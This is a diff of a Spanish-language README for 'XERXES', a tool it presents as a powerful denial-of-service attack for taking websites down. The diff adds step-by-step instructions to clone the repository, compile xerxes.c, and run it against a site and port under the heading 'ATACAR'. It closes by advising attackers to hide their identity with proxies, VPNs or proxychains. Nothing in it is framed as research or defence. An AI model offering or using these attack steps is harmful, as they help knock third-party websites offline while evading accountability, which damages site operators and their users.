@@ -1,14 +1,26 @@
-#XERXES
+### XERXES
 
-XerXes -La herramienta dos más potente de mR.Thg
+Que es XERXES un ataque (DOS) potente capaz de tumbar paginas web iniciando con solo un cmd aca abajo.
 
-COMPILAR
+### CREAR REPO
+```
+git clone https://github.com/luis498/XERXES.git
+```
 
-gcc -o xerxes xerxes.c
+### ENTRAR
+```
+cd (Buscalo)
+```
 
-LINUX/UNIX/MAC
+### INGRESAR
+```
+# gcc xerxes.c -o xerxes
+```
 
-./xerxes IP PORT
+### ATACAR
+```
+# ./xerxes www.fakesite.com 80
+```
 
 SER ANÓNIMO
 USAR PROXY VPN OPENVPN O PROXYCHAINS
